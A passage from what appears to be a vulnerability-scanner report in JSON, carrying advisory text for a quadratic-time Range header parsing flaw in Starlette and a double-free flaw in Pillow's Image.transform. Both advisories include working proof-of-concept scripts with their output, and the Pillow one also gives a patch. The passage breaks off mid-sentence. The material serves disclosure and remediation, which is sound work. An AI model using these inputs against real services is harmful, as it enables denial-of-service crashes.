service for its O(n^2) complexity. A crafted `Range` header can maximize its complexity.\n\u003e \n\u003e The merge loop processes each input range by scanning the entire result list, yielding quadratic behavior with many disjoint ranges. A crafted Range header with many small, non-overlapping ranges (or specially shaped numeric substrings) maximizes comparisons.\n\u003e \n\u003e   This affects any Starlette application that uses:\n\u003e \n\u003e   - ``starlette.staticfiles.StaticFiles`` (internally returns `FileResponse`) — `starlette/staticfiles.py:178`\n\u003e   - Direct ``starlette.responses.FileResponse`` responses\n\u003e \n\u003e ### PoC\n\u003e ```python\n\u003e #!/usr/bin/env python3\n\u003e \n\u003e import sys\n\u003e import time\n\u003e \n\u003e try:\n\u003e     import starlette\n\u003e     from starlette.responses import FileResponse\n\u003e except Exception as e:\n\u003e     print(f\"[ERROR] Failed to import starlette: {e}\")\n\u003e     sys.exit(1)\n\u003e \n\u003e \n\u003e def build_payload(length: int) -\u003e str:\n\u003e     \"\"\"Build the Range header value body: '0' * num_zeros + '0-'\"\"\"\n\u003e     return (\"0\" * length) + \"a-\"\n\u003e \n\u003e \n\u003e def test(header: str, file_size: int) -\u003e float:\n\u003e     start = time.perf_counter()\n\u003e     try:\n\u003e         FileResponse._parse_range_header(header, file_size)\n\u003e     except Exception:\n\u003e         pass\n\u003e     end = time.perf_counter()\n\u003e     elapsed = end - start\n\u003e     return elapsed\n\u003e \n\u003e \n\u003e def run_once(num_zeros: int) -\u003e None:\n\u003e     range_body = build_payload(num_zeros)\n\u003e     header = \"bytes=\" + range_body\n\u003e     # Use a sufficiently large file_size so upper bounds default to file size\n\u003e     file_size = max(len(range_body) + 10, 1_000_000)\n\u003e     \n\u003e     print(f\"[DEBUG] range_body length: {len(range_body)} bytes\")\n\u003e     elapsed_time = test(header, file_size)\n\u003e     print(f\"[DEBUG] elapsed time: {elapsed_time:.6f} seconds\\n\")\n\u003e \n\u003e \n\u003e if __name__ == \"__main__\":\n\u003e     print(f\"[INFO] Starlette Version: {starlette.__version__}\")\n\u003e     for n in [5000, 10000, 20000, 40000]:\n\u003e         run_once(n)\n\u003e \n\u003e \"\"\"\n\u003e $ python3 poc_dos_range.py\n\u003e [INFO] Starlette Version: 0.48.0\n\u003e [DEBUG] range_body length: 5002 bytes\n\u003e [DEBUG] elapsed time: 0.053932 seconds\n\u003e \n\u003e [DEBUG] range_body length: 10002 bytes\n\u003e [DEBUG] elapsed time: 0.209770 seconds\n\u003e \n\u003e [DEBUG] range_body length: 20002 bytes\n\u003e [DEBUG] elapsed time: 0.885296 seconds\n\u003e \n\u003e [DEBUG] range_body length: 40002 bytes\n\u003e [DEBUG] elapsed time: 3.238832 seconds\n\u003e \"\"\"\n\u003e ```\n\u003e \n\u003e ### Impact\n\u003e Any Starlette app serving files via FileResponse or StaticFiles; frameworks built on Starlette (e.g., FastAPI) are indirectly impacted when using file-serving endpoints. Unauthenticated remote attackers can exploit this via a single HTTP request with a crafted Range header.\n\n\u003c/details\u003e\n\n## [GHSA-7f5h-v6xp-fcq8](https://osv.dev/GHSA-7f5h-v6xp-fcq8)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e An unauthenticated attacker can send a crafted HTTP Range header that triggers quadratic-time processing in Starlette's `FileResponse` Range parsing/merging logic. This enables CPU exhaustion per request, causing denial‑of‑service for endpoints serving files (e.g., `StaticFiles` or any use of `FileResponse`).\n\u003e \n\u003e ### Details\n\u003e Starlette parses multi-range requests in ``FileResponse._parse_range_header()``, then merges ranges using an O(n^2) algorithm.\n\u003e \n\u003e ```python\n\u003e # starlette/responses.py\n\u003e _RANGE_PATTERN = re.compile(r\"(\\d*)-(\\d*)\") # vulnerable to O(n^2) complexity ReDoS\n\u003e \n\u003e class FileResponse(Response):\n\u003e     @staticmethod\n\u003e     def _parse_range_header(http_range: str, file_size: int) -\u003e list[tuple[int, int]]:\n\u003e         ranges: list[tuple[int, int]] = []\n\u003e         try:\n\u003e             units, range_ = http_range.split(\"=\", 1)\n\u003e         except ValueError:\n\u003e             raise MalformedRangeHeader()\n\u003e \n\u003e         # [...]\n\u003e \n\u003e         ranges = [\n\u003e             (\n\u003e                 int(_[0]) if _[0] else file_size - int(_[1]),\n\u003e                 int(_[1]) + 1 if _[0] and _[1] and int(_[1]) \u003c file_size else file_size,\n\u003e             )\n\u003e             for _ in _RANGE_PATTERN.findall(range_) # vulnerable\n\u003e             if _ != (\"\", \"\")\n\u003e         ]\n\u003e \n\u003e ```\n\u003e \n\u003e The parsing loop of ``FileResponse._parse_range_header()`` uses the regular expression which vulnerable to denial of service for its O(n^2) complexity. A crafted `Range` header can maximize its complexity.\n\u003e \n\u003e The merge loop processes each input range by scanning the entire result list, yielding quadratic behavior with many disjoint ranges. A crafted Range header with many small, non-overlapping ranges (or specially shaped numeric substrings) maximizes comparisons.\n\u003e \n\u003e   This affects any Starlette application that uses:\n\u003e \n\u003e   - ``starlette.staticfiles.StaticFiles`` (internally returns `FileResponse`) — `starlette/staticfiles.py:178`\n\u003e   - Direct ``starlette.responses.FileResponse`` responses\n\u003e \n\u003e ### PoC\n\u003e ```python\n\u003e #!/usr/bin/env python3\n\u003e \n\u003e import sys\n\u003e import time\n\u003e \n\u003e try:\n\u003e     import starlette\n\u003e     from starlette.responses import FileResponse\n\u003e except Exception as e:\n\u003e     print(f\"[ERROR] Failed to import starlette: {e}\")\n\u003e     sys.exit(1)\n\u003e \n\u003e \n\u003e def build_payload(length: int) -\u003e str:\n\u003e     \"\"\"Build the Range header value body: '0' * num_zeros + '0-'\"\"\"\n\u003e     return (\"0\" * length) + \"a-\"\n\u003e \n\u003e \n\u003e def test(header: str, file_size: int) -\u003e float:\n\u003e     start = time.perf_counter()\n\u003e     try:\n\u003e         FileResponse._parse_range_header(header, file_size)\n\u003e     except Exception:\n\u003e         pass\n\u003e     end = time.perf_counter()\n\u003e     elapsed = end - start\n\u003e     return elapsed\n\u003e \n\u003e \n\u003e def run_once(num_zeros: int) -\u003e None:\n\u003e     range_body = build_payload(num_zeros)\n\u003e     header = \"bytes=\" + range_body\n\u003e     # Use a sufficiently large file_size so upper bounds default to file size\n\u003e     file_size = max(len(range_body) + 10, 1_000_000)\n\u003e     \n\u003e     print(f\"[DEBUG] range_body length: {len(range_body)} bytes\")\n\u003e     elapsed_time = test(header, file_size)\n\u003e     print(f\"[DEBUG] elapsed time: {elapsed_time:.6f} seconds\\n\")\n\u003e \n\u003e \n\u003e if __name__ == \"__main__\":\n\u003e     print(f\"[INFO] Starlette Version: {starlette.__version__}\")\n\u003e     for n in [5000, 10000, 20000, 40000]:\n\u003e         run_once(n)\n\u003e \n\u003e \"\"\"\n\u003e $ python3 poc_dos_range.py\n\u003e [INFO] Starlette Version: 0.48.0\n\u003e [DEBUG] range_body length: 5002 bytes\n\u003e [DEBUG] elapsed time: 0.053932 seconds\n\u003e \n\u003e [DEBUG] range_body length: 10002 bytes\n\u003e [DEBUG] elapsed time: 0.209770 seconds\n\u003e \n\u003e [DEBUG] range_body length: 20002 bytes\n\u003e [DEBUG] elapsed time: 0.885296 seconds\n\u003e \n\u003e [DEBUG] range_body length: 40002 bytes\n\u003e [DEBUG] elapsed time: 3.238832 seconds\n\u003e \"\"\"\n\u003e ```\n\u003e \n\u003e ### Impact\n\u003e Any Starlette app serving files via FileResponse or StaticFiles; frameworks built on Starlette (e.g., FastAPI) are indirectly impacted when using file-serving endpoints. Unauthenticated remote attackers can exploit this via a single HTTP request with a crafted Range header.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/poetry.lock | starlette | 0.46.2 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-7f5h-v6xp-fcq8 | starlette | 0.49.1 |\n| PYSEC-2026-1942 | starlette | 0.49.1 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2025-62727\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              },
              "id": "CVE-2025-62727",
              "name": "CVE-2025-62727",
              "properties": {
                "security-severity": "7.5"
              },
              "relationships": [],
              "shortDescription": {
                "markdown": "CVE-2025-62727: Starlette vulnerable to O(n^2) DoS via Range header merging in ``starlette.responses.FileResponse``",
                "text": "CVE-2025-62727: Starlette vulnerable to O(n^2) DoS via Range header merging in ``starlette.responses.FileResponse``"
              }
            },
            {
              "deprecatedIds": [
                "CVE-2026-112402",
                "BIT-pillow-2026-112402",
                "GHSA-7mwm-ghpf-9vrm"
              ],
              "fullDescription": {
                "markdown": "```\n============================================================================\nDouble free in ImagingScaleAffine on calloc failure via Image.transform\nLocation: src/libImaging/Geometry.c:866  in ImagingScaleAffine()\nCommit:   a707c6b21c313880d0771e54965d142dd42358b6\n============================================================================\n```\n\nThere is a double free in Pillow's `Image.transform()` that crashes the process when an oversized transform runs out of memory. Instead of only raising `MemoryError`, Pillow frees the output image's memory once while handling the error and then again when the Python object is cleaned up. Anyone who can choose the output size of `Image.transform()` can trigger it, but only on a worker with a memory limit (a common hardening for image workers) or a 32-bit process. The result is a crash of the worker, plus corruption of its heap that has not been shown to be controllable.\n\nThe bug is in `ImagingScaleAffine()` in `src/libImaging/Geometry.c` (line 866). When its `calloc()` for the per-column lookup table of `4 × width` bytes fails, it calls `ImagingDelete(imOut)`. When the call comes from `Image.transform()`, `imOut` is the `Imaging` struct owned by the live Python `ImagingCore` output object. `_dealloc()` in `src/_imaging.c` later runs `ImagingDelete()` on the freed struct again, writing its mutex and refcount in freed memory and freeing the pixel blocks a second time. The path is reached with `Transform.EXTENT`, or `Transform.AFFINE` with a pure scale/translate matrix, under the default NEAREST resampling. A very wide, 1-row output size makes the lookup table the allocation that fails while the image itself still fits. On 64-bit Linux with default overcommit, that requires an address-space limit such as `ulimit -v`, `uwsgi --limit-as` or `systemd LimitAS=`. `resize()`, `thumbnail()` and `rotate()` are not affected. The attached reproducer runs on a stock build with a 1 GB limit: `transform((300000000, 1), EXTENT)` raises and catches `MemoryError`, then the process dies with SIGSEGV in `free()` called from `_dealloc()`. A memory-checking build reports the same path as a heap use-after-free. The faulty line was inherited from PIL 1.1.7 in the original fork commit, so every Pillow release since 1.0 is affected. A patch is attached.\n\n## Details\n\n`ImagingScaleAffine()` frees an image it does not own. On the one error path where its `calloc()` for the per-column lookup table fails, it calls `ImagingDelete(imOut)`. When reached through `Image.transform()`, `imOut` is the `Imaging` struct held by a live Python `ImagingCore` object; that object's `_dealloc()` later calls `ImagingDelete()` on the already-freed struct and frees its pixel blocks a second time.\n\nShortest demonstration on the stock build (the address-space limit stands in for `ulimit -v` / `uwsgi --limit-as` / `systemd LimitAS=` on a worker):\n\n```python\nimport resource, gc\nfrom PIL import Image\nresource.setrlimit(resource.RLIMIT_AS, (1_000_000_000,) * 2)\nsrc = Image.new(\"L\", (8, 8))\ntry:\n    src.transform((300_000_000, 1), Image.Transform.EXTENT, (0, 0, 8, 8))\nexcept MemoryError:\n    pass                      # expected, and the process should carry on\ngc.collect()                  # instead: SIGSEGV in _dealloc -\u003e ImagingDelete -\u003e free()\n```\n\nThe 300 MB output image allocates; `calloc(300000000, 4)` (1.2 GB) does not. `MemoryError` is raised as intended, but the interpreter then dies with SIGSEGV, gdb showing `free()` ← `memory_return_block`/`ImagingDestroyArray` (`src/libImaging/Storage.c:396,408`) ← `ImagingDelete` (`Storage.c:271`) ← `_dealloc` (`src/_imaging.c:188`). An AddressSanitizer build of the same sources (with `max_allocation_size_mb` used to make the `calloc` fail instead of an rlimit) reports `heap-use-after-free` in `ImagingDelete src/libImaging/Storage.c:257` called from `_dealloc src/_imaging.c:188`, on a 128-byte region \"freed by\" `ImagingDelete` ← `ImagingScaleAffine src/libImaging/Geometry.c:866` ← `ImagingTransformAffine Geometry.c:1043` ← `ImagingTransform Geometry.c:1135` ← `_transform src/_imaging.c:2153`, \"previously allocated by\" `ImagingNewPrologueSubtype Storage.c:53` ← … ← `_new src/_imaging.c:756`.\n\n### Code path\n\n`Image.transform()` creates the output image as an ordinary Python-owned image and then transforms *into* it:\n\n```python\n# src/PIL/Image.py:3008…3021\n        im = new(self.mode, size, fillcolor)\n        …\n            im.__transformer(\n                (0, 0, *size), self, method, data, resample, fillcolor is None\n            )\n```\n\n`__transformer()` rewrites `Transform.EXTENT` into an axis-aligned affine matrix (`src/PIL/Image.py:3040-3046`: `data = (xs, 0, x0, 0, ys, y0)`, `method = Transform.AFFINE`) and calls `self.im.transform(box, image.im, method, data, resample, fill)` (`Image.py:3117`). `resample` defaults to `Resampling.NEAREST` (`Image.py:2936`).\n\nIn C, `_transform()` passes its *own* image as the destination:\n\n```c\n/* src/_imaging.c:2153 */\n    imOut = ImagingTransform(\n        self-\u003eimage, imagep-\u003eimage, method, x0, y0, x1, y1, a, filter, fill\n    );\n```\n\n`ImagingTransformAffine()` takes the scaling fast path because the filter is NEAREST and the matrix has no shear:\n\n```c\n/* src/libImaging/Geometry.c:1035-1043 */\n    if (filterid || imIn-\u003etype == IMAGING_TYPE_I16) {\n        return ImagingGenericTransform(…);\n    }\n    if (a[1] == 0 \u0026\u0026 a[3] == 0) {\n        /* Scaling */\n        return ImagingScaleAffine(imOut, imIn, x0, y0, x1, y1, a, fill);\n    }\n```\n\nand `ImagingScaleAffine()` allocates a table of `imOut-\u003exsize` ints:\n\n```c\n/* src/libImaging/Geometry.c:863-868 */\n    /* malloc check ok, uses calloc for overflow */\n    xintab = (int *)calloc(imOut-\u003exsize, sizeof(int));\n    if (!xintab) {\n        ImagingDelete(imOut);                         /* \u003c-- imOut belongs to the caller */\n        return (Imaging)ImagingError_MemoryError();\n    }\n```\n\n`ImagingDelete()` (`src/libImaging/Storage.c:250-279`) drops the refcount to 0, returns the pixel blocks to the arena / `free()`s them via `im-\u003edestroy`, and `free(im)`. `self-\u003eimage` in the `ImagingCore` object still points at the freed struct. `_transform()` returns `NULL`, `Image.transform()` propagates `MemoryError`, the half-built output `Image` loses its last reference, and `_dealloc()` (`src/_imaging.c:188`) calls `ImagingDelete(imagep-\u003eimage)` again: it locks `im-\u003emutex` and decrements `im-\u003erefcount` inside freed memory, then walks `im-\u003eblocks` (already freed, typically reused by then) and frees every entry a second time. In the observed stock-build runs the freed `blocks` array had been overwritten, so `free()` receives a mangled pointer and the process segfaults; with other heap states it is a plain double free of a 300 MB block.\n\nEvery other error return in `Geometry.c` (`ImagingError_ModeError`, `ImagingError_Mismatch`, `\"bad filter number\"`, `\"bad transform method\"`) leaves `imOut` alone; line 866 is the only one that deletes it. The delete is only correct for the other caller, `_resize()` (`src/_imaging.c:2026-2030`), where `imOut` is a fresh `ImagingNewDirty()` temporary that nothing else references. The delete predates Pillow's git history: it came in with the PIL 1.1.7 import, `9a640e315715` (\"Forking PIL\", 2010-07-30), so every release since Pillow 1.0 is affected.\n\nThe output width is what decides whether the path is hit: the output image costs `width × height × pixelsize` bytes, the table an additional `4 × width`. A very wide, 1-row output (300 000 000 × 1 \"L\": 300 MB image, 1.2 GB table) makes the table the allocation that fails. `ImagingNewPrologueSubtype()` caps `xsize` at `INT_MAX/4 - 1`, so the table is at most ~2 GB.\n\n## Impact\n\nApplications that let a user choose the output size of `Image.transform()` — `Transform.EXTENT` (crop-and-scale), `Transform.AFFINE` with a pure scale/translate matrix, or the `ImageTransform.ExtentTransform`/`AffineTransform` helpers, all with the default NEAREST resampling — can have an allocation failure turned into a use-after-free and double free inside the worker process instead of the `MemoryError` the API is meant to raise. `resize()`, `thumbnail()` and `rotate()` do not reach this path; `Image.resize(..., NEAREST, box=...)` goes through `ImagingScaleAffine()` but owns its output, and raises a clean `MemoryError`. The second precondition is that the output image itself allocates but the extra `4 × width` bytes do not; on 64-bit Linux with default overcommit this requires an address-space limit on the process (`ulimit -v`, `uwsgi --limit-as`, `systemd LimitAS=`, an in-app `setrlimit`), which is a common hardening for image workers; 32-bit processes can reach it through ordinary address-space exhaustion. The demonstrated consequence is a crash of the process handling the request after `MemoryError` has already been raised and possibly handled. The second `ImagingDelete()` also writes into the freed 128-byte struct (mutex, refcount) and double-frees an attacker-sized block, which is heap corruption rather than a clean abort, but no control over the written data is shown.\n\n## Reproducing\n\nRun `repro` (a self-contained Python script) from any directory. It uses the installed stock build, so nothing is rebuilt, and has no companion files. It runs the demonstration above in a child interpreter (`python3 -c`, taking `WIDTH` as an argument): the child disables core files, sets `RLIMIT_AS` to 1 GB (the kind of limit image workers are commonly given), creates an 8×8 \"L\" image, calls `src.transform((WIDTH, 1), Image.Transform.EXTENT, (0, 0, 8, 8))` with the default NEAREST resampling, prints `MemoryError caught` if that raises, then runs `gc.collect()` and prints `alive`. EXTENT with NEAREST is a pure scale, so the call goes through `ImagingScaleAffine()`, which callocs a `4 × WIDTH`-byte table in addition to the `WIDTH`-byte output image.\n\nThe script runs the child twice:\n\n- **Control:** width 50 000 000. The 50 MB image and the 200 MB table both fit under the limit, and the transform succeeds, which shows the limit itself is harmless.\n- **Attack:** width 300 000 000. The 300 MB output image is allocated, but `calloc(300000000, 4)` (1.2 GB) fails. Pillow correctly raises `MemoryError`, and the child catches it. But `ImagingScaleAffine()` has already called `ImagingDelete()` on the output image it does not own. When the output image is released, it is freed again. The child prints `MemoryError caught` and then dies with SIGSEGV instead of printing `alive`.\n\nIf the attack child was killed by a signal and `gdb` is installed, the script runs the attack again under `gdb` and prints the backtrace. The crash is in `free()` ← `memory_return_block`/`ImagingDestroyArray` (`Storage.c:396,408`) ← `ImagingDelete` (`Storage.c:271`) ← `_dealloc` (`_imaging.c:188`). In other words, the Python object's destructor is deleting the already-freed struct a second time. The verdict does not depend on this step.\n\nThe last line is `BUG` when the control exits 0 and the attack prints `MemoryError caught` and then dies from a signal without printing `alive`. Otherwise it is `OK`. With the attached patch applied, the attack prints `MemoryError caught`, then `alive`, exits 0, and the script prints `OK`.\n\n## Suggested fix\n\n`ImagingScaleAffine()` never owns `imOut`. The attached patch removes the `ImagingDelete()` at `src/libImaging/Geometry.c:866` and makes the one caller that relied on it, `_resize()` in `src/_imaging.c`, clean up its own temporary, the same idiom `_gaussian_blur()`/`_unsharp_mask()` already use. This also fixes `_resize()` passing a possible `NULL` from `ImagingNewDirty()` into `ImagingTransform()`, and leaking the temporary on the other `ImagingTransform()` error returns:\n\n```diff\n--- a/src/libImaging/Geometry.c\n+++ b/src/libImaging/Geometry.c\n@@ -863,7 +863,7 @@ ImagingScaleAffine(\n     /* malloc check ok, uses calloc for overflow */\n     xintab = (int *)calloc(imOut-\u003exsize, sizeof(int));\n     if (!xintab) {\n-        ImagingDelete(imOut);\n+        /* imOut is owned by the caller; don't delete it here */\n         return (Imaging)ImagingError_MemoryError();\n     }\n--- a/src/_imaging.c\n+++ b/src/_imaging.c\n@@ -2024,10 +2024,16 @@ _resize(ImagingObject *self, PyObject *args) {\n         a[5] = box[1];\n \n         imOut = ImagingNewDirty(imIn-\u003emode, xsize, ysize);\n+        if (!imOut) {\n+            return NULL;\n+        }\n \n-        imOut = ImagingTransform(\n-            imOut, imIn, IMAGING_TRANSFORM_AFFINE, 0, 0, xsize, ysize, a, filter, 1\n-        );\n+        if (!ImagingTransform(\n+                imOut, imIn, IMAGING_TRANSFORM_AFFINE, 0, 0, xsize, ysize, a, filter, 1\n+            )) {\n+            ImagingDelete(imOut);\n+            return NULL;\n+        }\n     } else {\n```\n\nEvery `ImagingTransform*()` path returns the same `imOut` on success, so wrapping the original pointer in `PyImagingNew()` in `_resize()` is unchanged behaviour. With the patch applied to a clean checkout and rebuilt, the reproducer prints `OK` and `Image.resize(..., NEAREST, box=...)` under the same limit raises a clean `MemoryError`.\n\n## The patch\n\nStop ImagingScaleAffine() deleting the caller-owned output image on calloc failure; make _resize() free its own temporary instead\n\nApplies to `src/libImaging/Geometry.c` at the commit above.\n\n```diff\ndiff --git a/src/_imaging.c b/src/_imaging.c\nindex 7e9c0e391..ac1873292 100644\n--- a/src/_imaging.c\n+++ b/src/_imaging.c\n@@ -2024,10 +2024,16 @@ _resize(ImagingObject *self, PyObject *args) {\n         a[5] = box[1];\n \n         imOut = ImagingNewDirty(imIn-\u003emode, xsize, ysize);\n+        if (!imOut) {\n+            return NULL;\n+        }\n \n-        imOut = ImagingTransform(\n-            imOut, imIn, IMAGING_TRANSFORM_AFFINE, 0, 0, xsize, ysize, a, filter, 1\n-        );\n+        if (!ImagingTransform(\n+                imOut, imIn, IMAGING_TRANSFORM_AFFINE, 0, 0, xsize, ysize, a, filter, 1\n+            )) {\n+            ImagingDelete(imOut);\n+            return NULL;\n+        }\n     } else {\n         imOut = ImagingResample(imIn, xsize, ysize, filter, box);\n     }\ndiff --git a/src/libImaging/Geometry.c b/src/libImaging/Geometry.c\nindex 1bf92e26e..2baf000a5 100644\n--- a/src/libImaging/Geometry.c\n+++ b/src/libImaging/Geometry.c\n@@ -863,7 +863,7 @@ ImagingScaleAffine(\n     /* malloc check ok, uses calloc for overflow */\n     xintab = (int *)calloc(imOut-\u003exsize, sizeof(int));\n     if (!xintab) {\n-        ImagingDelete(imOut);\n+        /* imOut is owned by the caller; don't delete it here */\n         return (Imaging)ImagingError_MemoryError();\n     }\n```\n\n## The reproducer\n\n\u003cdetails\u003e\n\u003csummary\u003eReproducer — \u003ccode\u003erepro\u003c/code\u003e, 2,064 bytes (click to open)\u003c/summary\u003e\n\nIts last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.\n\n```python\n#!/usr/bin/env python3\n# UAF/double free in ImagingScaleAffine() (src/libImaging/Geometry.c:866):\n# on calloc() failure it ImagingDelete()s imOut, which for Image.transform()\n# is the Imaging struct owned by the live Python output image; that image's\n# _dealloc then ImagingDelete()s it again. Stock /src build, no rebuild.\n# A 1 GB RLIMIT_AS makes the 300 MB output image fit but the 1.2 GB\n# 4*width lookup table fail. Expected: MemoryError, process survives.\nimport subprocess, sys, textwrap, signal\n\nchild = textwrap.dedent('''\n    import resource, gc, sys\n    from PIL import Image\n    resource.setrlimit(resource.RLIMIT_CORE, (0, 0))\n    resource.setrlimit(resource.RLIMIT_AS, (1_000_000_000,) * 2)\n    w = int(sys.argv[1])\n    src = Image.new(\"L\", (8, 8))\n    try:\n        src.transform((w, 1), Image.Transform.EXTENT, (0, 0, 8, 8))\n        print(\"transform ok\")\n    except MemoryError:\n        print(\"MemoryError caught\")\n    gc.collect()\n    print(\"alive\")\n''')\n\ndef run(width):\n    p = subprocess.run([sys.executable, \"-u\", \"-c\", child, str(width)],\n                       capture_output=True, text=True, timeout=50)\n    print(f\"-- width={width}: rc={p.returncode}\\n{p.stdout.rstrip()}\")\n    return p\n\nctrl = run(50_000_000)      # 50 MB image + 200 MB table fit under the limit\natt = run(300_000_000)      # 300 MB image fits, 1.2 GB table does not\nbug = (ctrl.returncode == 0 and \"MemoryError caught\" in att.stdout\n       and \"alive\" not in att.stdout and att.returncode \u003c 0)\nif att.returncode \u003c 0:\n    print(\"attack child killed by\", signal.Signals(-att.returncode).name)\n    import shutil\n    if shutil.which(\"gdb\"):   # evidence only; verdict does not depend on it\n        g = subprocess.run([\"gdb\", \"-q\", \"-batch\", \"-ex\", \"run\", \"-ex\", \"bt 6\", \"--args\",\n                            sys.executable, \"-c\", child, \"300000000\"],\n                           capture_output=True, text=True, timeout=120)\n        print(\"\\n\".join(l for l in g.stdout.splitlines()\n                        if l.startswith(\"#\") or \"signal\" in l))\nprint(\"BUG\" if bug else \"OK\")\n```\n\u003c/details\u003e\n\n---",
                "text": "```\n============================================================================\nDouble free in ImagingScaleAffine on calloc failure via Image.transform\nLocation: src/libImaging/Geometry.c:866  in ImagingScaleAffine()\nCommit:   a707c6b21c313880d0771e54965d142dd42358b6\n============================================================================\n```\n\nThere is a double free in Pillow's `Image.transform()` that crashes the process when an oversized transform runs out of memory. Instead of only raising `MemoryError`, Pillow frees the output image's memory once while handling the error and then again when the Python object is cleaned up. Anyone who can choose the output size of `Image.transform()` can trigger it, but only on a worker with a memory limit (a common hardening for image workers) or a 32-bit process. The result is a crash of the worker, plus corruption of its heap that has not been shown to be controllable.\n\nThe bug is in `ImagingScaleAffine()` in `src/libImaging/Geometry.c` (line 866). When its `calloc()` for the per-column lookup table of `4 × width` bytes fails, it calls `ImagingDelete(imOut)`. When the call comes from `Image.transform()`, `imOut` is the `Imaging` struct owned by the live Python `ImagingCore` output object. `_dealloc()` in `src/_imaging.c` later runs `ImagingDelete()` on the freed struct again, writing its mutex and refcount in freed memory and freeing the pixel blocks a second time. The path is reached with `Transform.EXTENT`, or `Transform.AFFINE` with a pure scale/translate matrix, under the default NEAREST resampling. A very wide, 1-row output size makes the lookup table the allocation that fails while the image itself still fits. On 64-bit Linux with default overcommit, that requires an address-space limit such as `ulimit -v`, `uwsgi --limit-as` or `systemd LimitAS=`. `resize()`, `thumbnail()` and `rotate()` are not affected. The attached reproducer runs on a stock build with a 1 GB limit: `transform((300000000, 1), EXTENT)` raises and catches `MemoryError`, then the process dies with SIGSEGV in `free()` called from `_dealloc()`. A memory-checking build reports the same path as a heap use-after-free. The faulty line was inherited from PIL 1.1.7 in the original fork commit, so every Pillow release since 1.0 is affected. A patch is attached.\n\n## Details\n\n`ImagingScaleAffine()` frees an image it does not own. On the one error path where its `calloc()` for the per-column lookup table fails, it calls `ImagingDelete(imOut)`. When reached through `Image.transform()`, `imOut` is the `Imaging` struct held by a live Python `ImagingCore` object; that object's `_dealloc()` later calls `ImagingDelete()` on the already-freed struct and frees its pixel blocks a second time.\n\nShortest demonstration on the stock build (the address-space limit stands in for `ulimit -v` / `uwsgi --limit-as` / `systemd LimitAS=` on a worker):\n\n```python\nimport resource, gc\nfrom PIL import Image\nresource.setrlimit(resource.RLIMIT_AS, (1_000_000_000,) * 2)\nsrc = Image.new(\"L\", (8, 8))\ntry:\n    src.transform((300_000_000, 1), Image.Transform.EXTENT, (0, 0, 8, 8))\nexcept MemoryError:\n    pass                      # expected, and the process should carry on\ngc.collect()                  # instead: SIGSEGV in _dealloc -\u003e ImagingDelete -\u003e free()\n```\n\nThe 300 MB output image allocates; `calloc(300000000, 4)` (1.2 GB) does not. `MemoryError` is raised as intended, but the interpreter then dies with SIGSEGV, gdb showing `free()` ← `memory_return_block`/`ImagingDestroyArray` (`src/libImaging/Storage.c:396,408`) ← `ImagingDelete` (`Storage.c:271`) ← `_dealloc` (`src/_imaging.c:188`). An AddressSanitizer build of the same sources (with `max_allocation_size_mb` used to make the `calloc` fail instead of an rlimit) reports `heap-use-after-free` in `ImagingDelete src/libImaging/Storage.c:257` called from `_dealloc src/_imaging.c:188`, on a 128-byte region \"freed by\" `ImagingDelete` ← `ImagingScaleAffine src/libImaging/Geometry.c:866` ← `ImagingTransformAffine Geometry.c:1043` ← `ImagingTransform Geometry.c:1135` ← `_transform src/_imaging.c:2153`, \"previously allocated by\" `ImagingNewPrologueSubtype Storage.c:53` ← … ← `_new src/_imaging.c:756`.\n\n### Code path\n\n`Image.transform()` creates the output image as an ordinary Python-owned image and then transforms *into* it:\n\n```python\n# src/PIL/Image.py:3008…3021\n        im = new(self.mode, size, fillcolor)\n        …\n            im.__transformer(\n                (0, 0, *size), self, method, data, resample, fillcolor is None\n            )\n```\n\n`__transformer()` rewrites `Transform.EXTENT` into an axis-aligned affine matrix (`src/PIL/Image.py:3040-3046`: `data = (xs, 0, x0, 0, ys, y0)`, `method = Transform.AFFINE`) and calls `self.im.transform(box, image.im, method, data, resample, fill)` (`Image.py:3117`). `resample` defaults to `Resampling.NEAREST` (`Image.py:2936`).\n\nIn C, `_transform()` passes its *own* image as the destination:\n\n```c\n/* src/_imaging.c:2153 */\n    imOut = ImagingTransform(\n        self-\u003eimage, imagep-\u003eimage, method, x0, y0, x1, y1, a, filter, fill\n    );\n```\n\n`ImagingTransformAffine()` takes the scaling fast path because the filter is NEAREST and the matrix has no shear:\n\n```c\n/* src/libImaging/Geometry.c:1035-1043 */\n    if (filterid || imIn-\u003etype == IMAGING_TYPE_I16) {\n        return ImagingGenericTransform(…);\n    }\n    if (a[1] == 0 \u0026\u0026 a[3] == 0) {\n        /* Scaling */\n        return ImagingScaleAffine(imOut, imIn, x0, y0, x1, y1, a, fill);\n    }\n```\n\nand `ImagingScaleAffine()` allocates a table of `imOut-\u003exsize` ints:\n\n```c\n/* src/libImaging/Geometry.c:863-868 */\n    /* malloc check ok, uses calloc for overflow */\n    xintab = (int *)calloc(imOut-\u003exsize, sizeof(int));\n    if (!xintab) {\n        ImagingDelete(imOut);                         /* \u003c-- imOut belongs to the caller */\n        return (Imaging)ImagingError_MemoryError();\n    }\n```\n\n`ImagingDelete()` (`src/libImaging/Storage.c:250-279`) drops the refcount to 0, returns the pixel blocks to the arena / `free()`s them via `im-\u003edestroy`, and `free(im)`. `self-\u003eimage` in the `ImagingCore` object still points at the freed struct. `_transform()` returns `NULL`, `Image.transform()` propagates `MemoryError`, the half-built output `Image` loses its last reference, and `_dealloc()` (`src/_imaging.c:188`) calls `ImagingDelete(imagep-\u003eimage)` again: it locks `im-\u003emutex` and decrements `im-\u003erefcount` inside freed memory, then walks `im-\u003eblocks` (already freed, typically reused by then) and frees every entry a second time. In the observed stock-build runs the freed `blocks` array had been overwritten, so `free()` 